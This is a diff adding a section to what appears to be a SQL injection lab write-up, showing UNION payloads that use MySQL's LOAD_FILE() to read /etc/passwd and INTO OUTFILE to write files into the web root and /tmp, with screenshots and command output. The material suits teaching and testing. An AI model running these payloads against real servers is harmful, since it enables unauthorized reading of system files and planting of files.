@@ -1793,3 +1793,119 @@ LIMIT 3,1
 
 until they discovered all the tables.
 
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+ Reading Files Using SQL Injection
+
+Now let's see how SQL Injection can be used to read files from the server.
+
+This are the scripts we are using in this exercise 
+
+<img width="646" height="262" alt="Screenshot 2026-06-23 at 4 40 16 PM" src="https://github.com/user-attachments/assets/ff575b4d-1b7a-4f7e-889d-fe62d6afed44" />
+
+
+We already know that the application is vulnerable to SQL Injection and that column 2 is displayed on the webpage. We can use MySQL's `LOAD_FILE()` function to read files from the operating system.
+
+Use the following payload:
+
+```sql
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL
+```
+
+Here:
+
+ `LOAD_FILE()` reads the specified file.
+ `/etc/passwd` is a common Linux file containing user account information.
+ The output will be displayed in column 2.
+
+After executing the payload, the contents of `/etc/passwd` are displayed on the page.
+
+<img width="1440" height="891" alt="Screenshot 2026-06-23 at 4 21 27 PM" src="https://github.com/user-attachments/assets/3f61b7f7-1a84-4dfa-9cb7-da9cd0fb7a59" />
+
+
+This confirms that the database user has permission to read files from the server.
+
+---
+
+ Writing Files Using SQL Injection
+
+Now let's see if we can write files to the target system.
+
+We will use MySQL's `INTO OUTFILE` statement.
+
+Use the following payload:
+
+```sql
+' UNION SELECT
+'example example',
+NULL,NULL,NULL,NULL
+INTO OUTFILE '/var/www/html/example.txt'
+```
+
+The goal is to create a file called `example.txt` inside the web server directory.
+
+After executing the payload, MySQL returns an error.
+
+<img width="1440" height="887" alt="Screenshot 2026-06-23 at 4 27 10 PM" src="https://github.com/user-attachments/assets/afc36ca8-3cf8-4632-8438-98dc033278ef" />
+
+
+The error indicates that MySQL does not have permission to write to the web root directory.
+
+---
+
+ Trying a Writable Directory
+
+Instead of writing to the web root, let's try writing to the temporary directory.
+
+Use:
+
+```sql
+' UNION SELECT
+'example example',
+NULL,NULL,NULL,NULL
+INTO OUTFILE '/tmp/example.txt'
+```
+
+This time the query executes successfully.
+
+
+Now verify the file on the target system:
+
+```bash
+ls -la /tmp
+```
+
+We can see the newly created file:
+
+```bash
+example.txt
+```
+
+
+To view its contents:
+
+```bash
+cat /tmp/example.txt
+```
+
+Output:
+
+```text
+example example
+```
+
+<img width="1440" height="387" alt="Screenshot 2026-06-23 at 4 34 22 PM" src="https://github.com/user-attachments/assets/a3333278-5533-4caa-a150-b463dafc7de6" />
+
+
+---
+
+ Result
+
+We successfully:
+
+ Read operating system files using `LOAD_FILE()`
+ Created a file on the server using `INTO OUTFILE`
+
+This demonstrates that SQL Injection can sometimes provide capabilities similar to File Disclosure and File Upload vulnerabilities, depending on the permissions assigned to the database account.
